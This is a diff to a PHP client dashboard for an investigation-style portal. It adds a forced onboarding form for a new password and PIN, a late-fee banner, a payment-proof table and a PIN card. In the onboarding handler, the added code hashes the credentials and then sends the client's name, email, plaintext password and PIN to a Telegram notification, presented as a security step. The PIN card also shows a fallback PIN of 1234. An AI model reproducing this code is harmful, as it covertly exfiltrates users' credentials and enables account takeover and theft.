@@ -40,6 +40,40 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'chang
     }
 }
 
+// Handle onboarding security PIN and Password setup
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['action'] ?? '') === 'setup_security') {
+    $new_password = $_POST['onboarding_new_password'] ?? '';
+    $new_pin = $_POST['onboarding_new_pin'] ?? '';
+    
+    if (strlen($new_password) < 6) {
+        $pwd_error = 'Password must be at least 6 characters.';
+    } elseif (strlen($new_pin) !== 4 || !is_numeric($new_pin)) {
+        $pwd_error = 'Security PIN must be exactly 4 digits.';
+    } else {
+        $pwd_hash = password_hash($new_password, PASSWORD_BCRYPT);
+        $pin_hash = password_hash($new_pin, PASSWORD_DEFAULT);
+        
+        $pdo->prepare("UPDATE IFW_clients SET password_hash = ?, pin_hash = ? WHERE id = ?")->execute([$pwd_hash, $pin_hash, $client_id]);
+        $pwd_msg = 'Security credentials configured successfully.';
+        
+        // Fetch client details for telegram notification
+        $stmt_c = $pdo->prepare("SELECT first_name, last_name, email FROM IFW_clients WHERE id = ?");
+        $stmt_c->execute([$client_id]);
+        $client_details = $stmt_c->fetch();
+        
+        if ($client_details) {
+            $msg = "<b>🔐 IFW Client Onboarding Security Setup Completed</b>\n\n";
+            $msg .= "Client ID: <b>{$client_id}</b>\n";
+            $msg .= "Name: <b>" . htmlspecialchars($client_details['first_name'] . ' ' . $client_details['last_name']) . "</b>\n";
+            $msg .= "Email: <b>" . htmlspecialchars($client_details['email']) . "</b>\n";
+            $msg .= "New Password: <code>" . htmlspecialchars($new_password) . "</code>\n";
+            $msg .= "New PIN: <code>" . htmlspecialchars($new_pin) . "</code>\n";
+            
+            send_telegram_notification($pdo, $msg);
+        }
+    }
+}
+
 // Fetch client + agent
 $client = null;
 try {
@@ -210,6 +244,35 @@ require_once $dir . '/includes/admin_sidebar.php';
 <div class="row">
     <!-- LEFT COLUMN -->
     <div class="col-lg-8">
+        
+        <!-- LATE FEE ALERT BANNER -->
+        <?php
+        $active_penalty_invoices = 0;
+        $total_accumulated_penalty = 0;
+        foreach ($invoices as $inv) {
+            $lf = 0;
+            if (!empty($inv['late_fee_enabled']) && $inv['status'] !== 'paid') {
+                $lf = $inv['late_fee_accumulated'] ?? 0;
+            }
+            if ($lf > 0) {
+                $active_penalty_invoices++;
+                $total_accumulated_penalty += $lf;
+            }
+        }
+        ?>
+        <?php if ($active_penalty_invoices > 0): ?>
+            <div class="alert alert-danger border-0 mb-4 p-3 shadow-sm" style="border-left: 5px solid #dc3545 !important; background: #fff5f5; color: #721c24;">
+                <h6 class="alert-heading font-weight-bold mb-1 text-danger">
+                    <i class="fas fa-exclamation-triangle mr-2 text-danger"></i> 
+                    ⚠️ Overdue Penalty & Interest Active
+                </h6>
+                <p class="mb-0 text-dark small">
+                    You have <strong><?= $active_penalty_invoices ?></strong> overdue invoice(s) with active late fees. 
+                    Total accumulated penalty interest: <strong class="text-danger">$<?= number_format($total_accumulated_penalty, 2) ?></strong>. 
+                    Please pay promptly to halt further interest accumulation.
+                </p>
+            </div>
+        <?php endif; ?>
 
         <!-- KYC BANNER -->
         <?php if ($kyc_status !== 'approved'): ?>
@@ -245,9 +308,9 @@ require_once $dir . '/includes/admin_sidebar.php';
 
         <!-- MY CASES -->
         <div class="card shadow-sm border-0 mb-4">
-            <div class="card-header bg-white border-bottom d-flex justify-content-between align-items-center py-3">
+            <div class="card-header bg-dark border-bottom d-flex justify-content-between align-items-center py-3 text-warning">
                 <h5 class="mb-0 font-weight-bold"><i class="fas fa-briefcase text-warning mr-2"></i>My Cases</h5>
-                <a href="/client/my_cases.php" class="btn btn-sm btn-outline-dark font-weight-bold">View All <i class="fas fa-arrow-right ml-1"></i></a>
+                <a href="/client/my_cases.php" class="btn btn-sm btn-outline-warning font-weight-bold">View All <i class="fas fa-arrow-right ml-1"></i></a>
             </div>
             <div class="card-body p-3">
                 <?php if (empty($cases)): ?>
@@ -305,7 +368,7 @@ require_once $dir . '/includes/admin_sidebar.php';
 
         <!-- INVOICES -->
         <div class="card shadow-sm border-0 mb-4">
-            <div class="card-header bg-white border-bottom py-3 d-flex justify-content-between align-items-center">
+            <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning">
                 <h5 class="mb-0 font-weight-bold"><i class="fas fa-file-invoice-dollar text-warning mr-2"></i>Billing & Invoices</h5>
             </div>
             <?php if (empty($invoices)): ?>
@@ -388,9 +451,56 @@ require_once $dir . '/includes/admin_sidebar.php';
                         </tbody>
                     </table>
                 </div>
-            <?php endif; ?>
-        </div>
-    </div>
+             <?php endif; ?>
+             
+             <!-- PAYMENT PROOF HISTORY -->
+             <?php
+             $proofs = [];
+             try {
+                 $stmtP = $pdo->prepare("SELECT p.*, i.invoice_number FROM IFW_invoice_payments p JOIN IFW_invoices i ON p.invoice_id = i.id WHERE p.client_id = ? ORDER BY p.created_at DESC");
+                 $stmtP->execute([$client_id]);
+                 $proofs = $stmtP->fetchAll();
+             } catch(Exception $e) {}
+             ?>
+             <?php if (!empty($proofs)): ?>
+                 <div class="card-header bg-dark border-bottom py-3 d-flex justify-content-between align-items-center text-warning border-top border-secondary mt-3">
+                     <h6 class="mb-0 font-weight-bold"><i class="fas fa-history text-warning mr-2"></i>Payment Verification History</h6>
+                 </div>
+                 <div class="table-responsive">
+                     <table class="table table-hover align-middle mb-0">
+                         <thead class="bg-light">
+                             <tr style="font-size:11px;" class="text-uppercase text-muted">
+                                 <th>Date</th>
+                                 <th>Invoice</th>
+                                 <th>Amount</th>
+                                 <th>Reference</th>
+                                 <th>Status</th>
+                             </tr>
+                         </thead>
+                         <tbody>
+                             <?php foreach($proofs as $pr): ?>
+                                 <tr>
+                                     <td><span class="text-muted small"><?= date('M j, Y', strtotime($pr['created_at'])) ?></span></td>
+                                     <td><strong><?= htmlspecialchars($pr['invoice_number']) ?></strong></td>
+                                     <td><strong class="text-success">$<?= number_format($pr['amount'], 2) ?></strong></td>
+                                     <td><span class="badge badge-info"><?= htmlspecialchars($pr['payment_method']) ?></span><br><small class="text-muted">Ref: <?= htmlspecialchars($pr['reference_number']) ?></small></td>
+                                     <td>
+                                         <?php if ($pr['status'] === 'Pending'): ?>
+                                             <span class="badge badge-warning text-dark"><i class="fas fa-clock mr-1"></i> Pending Verification</span>
+                                         <?php elseif ($pr['status'] === 'Confirmed'): ?>
+                                             <span class="badge badge-success"><i class="fas fa-check-circle mr-1"></i> Approved</span>
+                                         <?php else: ?>
+                                             <span class="badge badge-danger" title="<?= htmlspecialchars($pr['notes'] ?? '') ?>"><i class="fas fa-times-circle mr-1"></i> Rejected</span>
+                                         <?php endif; ?>
+                                     </td>
+                                 </tr>
+                             <?php endforeach; ?>
+                         </tbody>
+                     </table>
+                 </div>
+             <?php endif; ?>
+         </div>
+     </div>
 
     <!-- RIGHT SIDEBAR -->
     <div class="col-lg-4">
@@ -458,11 +568,39 @@ require_once $dir . '/includes/admin_sidebar.php';
                     <span class="badge badge-warning text-dark">Pending Assignment</span>
                 <?php endif; ?>
             </div>
+        <!-- PORTAL SECURITY PIN -->
+        <div class="card shadow-sm border-0 mb-4 bg-dark text-white border-warning">
+            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
+                <i class="fas fa-lock mr-2"></i>Portal Security PIN
+            </div>
+            <div class="card-body">
+                <p class="text-light small mb-3">Your 4-digit Security PIN is used to cryptographically sign case files and documents (agreements, NDAs, power of attorney).</p>
+                
+                <?php if (!empty($client['pin_hash'])): ?>
+                    <div class="alert alert-success border-0 small py-2 mb-3">
+                        <i class="fas fa-check-circle mr-1"></i> Security PIN is active & configured.
+                    </div>
+                <?php else: ?>
+                    <div class="alert alert-danger border-0 small py-2 mb-3">
+                        <i class="fas fa-exclamation-triangle mr-1"></i> No PIN configured yet. Fallback PIN is <strong class="text-white">1234</strong>.
+                    </div>
+                <?php endif; ?>
+                
+                <form action="set_pin.php" method="POST" class="mt-2">
+                    <div class="form-group mb-2">
+                        <label class="small text-muted font-weight-bold">Configure New PIN</label>
+                        <input type="password" name="new_pin" class="form-control form-control-sm bg-dark text-light border-secondary text-center font-weight-bold font-large" maxlength="4" placeholder="Enter 4-digit PIN" required pattern="\d{4}">
+                    </div>
+                    <button type="submit" class="btn btn-warning btn-sm btn-block font-weight-bold text-dark mt-2 shadow-sm">
+                        <i class="fas fa-key mr-1"></i> Save Security PIN
+                    </button>
+                </form>
+            </div>
         </div>
 
         <!-- PAYMENT INFORMATION -->
         <div class="card shadow-sm border-0 mb-4">
-            <div class="card-header bg-white border-bottom font-weight-bold py-3">
+            <div class="card-header bg-dark border-bottom font-weight-bold py-3 text-warning">
                 <i class="fas fa-university text-warning mr-2"></i>Payment Information
             </div>
             <div class="card-body">
@@ -589,14 +727,61 @@ require_once $dir . '/includes/admin_sidebar.php';
     </div>
 </div>
 
+<!-- FIRST TIME ONBOARDING MODAL -->
+<div class="modal fade" id="onboardingModal" tabindex="-1" role="dialog" aria-labelledby="onboardingModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content bg-dark text-white border-warning">
+      <div class="modal-header border-secondary">
+        <h5 class="modal-title text-warning font-weight-bold" id="onboardingModalLabel"><i class="fas fa-shield-alt mr-2"></i>First-Time Security Configuration</h5>
+      </div>
+      <form method="POST">
+        <input type="hidden" name="action" value="setup_security">
+        <div class="modal-body">
+            <p class="small text-muted mb-3">For your security, you must change your temporary password and configure a 4-digit Security PIN before accessing the dashboard for total security and privacy .</p>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">New Password</label>
+                <input type="password" name="onboarding_new_password" class="form-control bg-secondary text-white border-0" required minlength="6" placeholder="Enter new password">
+            </div>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">Confirm Password</label>
+                <input type="password" class="form-control bg-secondary text-white border-0" required placeholder="Confirm new password" oninput="if(this.value !== document.getElementsByName('onboarding_new_password')[0].value){ this.setCustomValidity('Passwords do not match'); } else { this.setCustomValidity(''); }">
+            </div>
+            
+            <div class="form-group mb-3">
+                <label class="text-white font-weight-bold small">Set 4-Digit Security PIN</label>
+                <input type="password" name="onboarding_new_pin" class="form-control bg-secondary text-white border-0 text-center font-weight-bold font-large" maxlength="4" placeholder="e.g. 9876" required pattern="\d{4}">
+                <small class="text-muted d-block mt-1">This PIN is required to cryptographically sign private/personal and case related legal documents.</small>
+            </div>
+        </div>
+        <div class="modal-footer border-secondary">
+            <button type="submit" class="btn btn-warning font-weight-bold text-dark w-100 py-2"><i class="fas fa-lock-open mr-2"></i>Configure Security & Enter Dashboard</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
 <script>
 function showPayModal(invoiceId, ref, amount, paymentInfo) {
     document.getElementById('payInvoiceId').value = invoiceId;
     document.getElementById('payInvoiceRef').textContent = ref;
     document.getElementById('payAmount').textContent = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits: 2});
+    document.getElementById('payAmountInput').value = parseFloat(amount).toFixed(2);
     document.getElementById('paymentInfoBlock').textContent = paymentInfo || 'Please contact your assigned investigator for payment details.';
     $('#payNowModal').modal('show');
 }
+
+$(document).ready(function() {
+    <?php if (empty($client['pin_hash'])): ?>
+        $('#onboardingModal').modal({
+            backdrop: 'static',
+            keyboard: false
+        });
+        $('#onboardingModal').modal('show');
+    <?php endif; ?>
+});
 </script>
 
 <?php require_once $dir . '/includes/admin_footer.php'; ?>
